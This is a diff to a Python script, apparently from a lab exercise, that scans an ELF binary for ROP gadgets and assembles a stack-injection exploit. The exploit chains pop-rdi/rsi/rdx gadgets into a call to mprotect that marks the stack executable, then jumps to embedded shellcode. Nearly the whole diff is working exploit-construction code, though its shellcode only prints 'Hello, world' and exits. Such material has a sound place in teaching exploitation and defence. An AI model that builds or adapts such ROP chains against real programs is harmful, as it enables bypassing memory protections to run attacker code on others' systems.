@@ -3,8 +3,14 @@
 from capstone import *
 from elftools.elf.elffile import ELFFile
 from elftools.elf.relocation import RelocationSection
-filename= './vuln_prog2.bin'
+filename= './victim'
 disas = [] #list of tuples: tup[0] = address, tup[1] = instruction, tup[2] = args
+
+def zerochecker(bytes, expectedLength):
+    while len(bytes) != expectedLength:
+        bytes = "0x0" + bytes[2:]
+    return bytes
+
 with open(filename, 'rb') as file:
         elf = ELFFile(file)
         code = elf.get_section_by_name('.text')
@@ -78,13 +84,13 @@ rdx_addr = b""
 for x in range(0, len(gadgets)):
     if (gadgets[x][0][2] == "rdi") and (len(gadgets[x]) < shortest_rdi):
         shortest_rdi = len(gadgets[x])
-        rdi_addr = bytes.fromhex(hex(gadgets[x][0][0])[2:])
+        rdi_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
     elif (gadgets[x][0][2] == "rsi") and (len(gadgets[x]) < shortest_rsi):
         shortest_rsi = len(gadgets[x])
-        rsi_addr = bytes.fromhex(hex(gadgets[x][0][0])[2:])
+        rsi_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
     elif (gadgets[x][0][2] == "rdx") and (len(gadgets[x]) < shortest_rdx):
         shortest_rdx = len(gadgets[x])
-        rdx_addr = bytes.fromhex(hex(gadgets[x][0][0])[2:])
+        rdx_addr = bytearray.fromhex(zerochecker(hex(gadgets[x][0][0]),10)[2:])
 
 print("shortest_rdi = " + str(shortest_rdi))
 print(rdi_addr)
@@ -97,42 +103,53 @@ heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for
 if heapOrStack == "S":
         baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
         addressOfMprotect = input("Input address of mprotect (PLT or libc is fine): ")
-        gadget1addr = "0x0"
-        gadget2addr = "0x0"
-        gadget3addr = "0x0"
+        addressOfPayload = input("Input address of start of ROP payload")
+        baseOfStack = input("Input address of the base of the stack")
+        shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x01\x48\x81\xee\x10\x11\x11\x01\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x48\x83\xc7\x64\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"
+        rdi_addr.reverse()
+        rsi_addr.reverse()
+        rdx_addr.reverse()
 
-        gadget1 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget1addr, 16)))
-        gadget1.reverse()
-        gadget2 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget2addr, 16)))
-        gadget2.reverse()
-        gadget3 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget3addr, 16)))
-        gadget3.reverse()
-
-        arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc st$
-        arg_addr.reverse()
-
-        arg_len = b"\x00\x10\x00"  # len of the shellcode as size_t
-
-        arg_prot = b"\x07"  # int, look at man pages (c-level flags)
+        #arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc st$
+        #arg_addr.reverse()
 
         faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
         faddr_byte_array.reverse()
 
-# check if ROP payload has the gadgets etc to actually be built
+        baseOfStack_byte_array = bytearray.fromhex(baseOfStack[2:])
+        baseOfStack_byte_array.reverse()
 
-# start building ROP payload
-garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00"
-rdi_arg =
-rsi_arg =
-rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
-mprotect_addr = # given as input
-shellcode_addr =
-shellcode =
 
-# gadget addrs need to be calculated from base of binary
+        # check if ROP payload has the gadgets etc to actually be built
+        
+        sizeOfStack = int(addressOfPayload, 16) - int(baseOfStack, 16)
+        sizeOfPayload = 64+8*6*3 + len(shellcode)
+        #start of mprotect = address of payload - size of payload - that mod 4096
+        endOfStack = int(addressOfPayload, 16) - sizeOfPayload
+        startOfMprotect = endOfStack - endOfStack%4096
+        #size of mprotect = size of stack + size of payload + endofstack%4096
+        sizeOfMprotect = sizeOfStack + sizeOfPayload + endOfStack%4096
 
-payload = rdi_addr + rdi_arg + garbage * (shortest_rdi - 2)
-payload += rsi_addr + rsi_arg + garbage * (shortest_rsi - 2)
-payload += rdx_addr + rdx_arg + garbage * (shortest_rdx - 2)
-payload += mprotect_addr + shellcode_addr + shellcode
+
+
+        # start building ROP payload
+        garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00"
+        print(hex(startOfMprotect))
+        print(zerochecker(hex(startOfMprotect),18))
+        rdi_arg = bytearray.fromhex(zerochecker(hex(startOfMprotect), 18)[2:])
+        rdi_arg.reverse()
+        rsi_arg = bytearray.fromhex(zerochecker(hex(sizeOfMprotect), 18)[2:])
+        rsi_arg.reverse()
+        rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
+        mprotect_addr = faddr_byte_array
+
+        # gadget addrs need to be calculated from base of binary
+
+        payload = rdi_addr + rdi_arg + garbage * (shortest_rdi - 2)
+        payload += rsi_addr + rsi_arg + garbage * (shortest_rsi - 2)
+        payload += rdx_addr + rdx_arg + garbage * (shortest_rdx - 2)
+        payload += mprotect_addr
+        shellcode_addr = bytearray.fromhex(hex(int(addressOfPayload, 16) + len(payload) + 8)[2:])
+        payload += shellcode_addr + b"\x00\x00" + shellcode
+        print(payload)
 
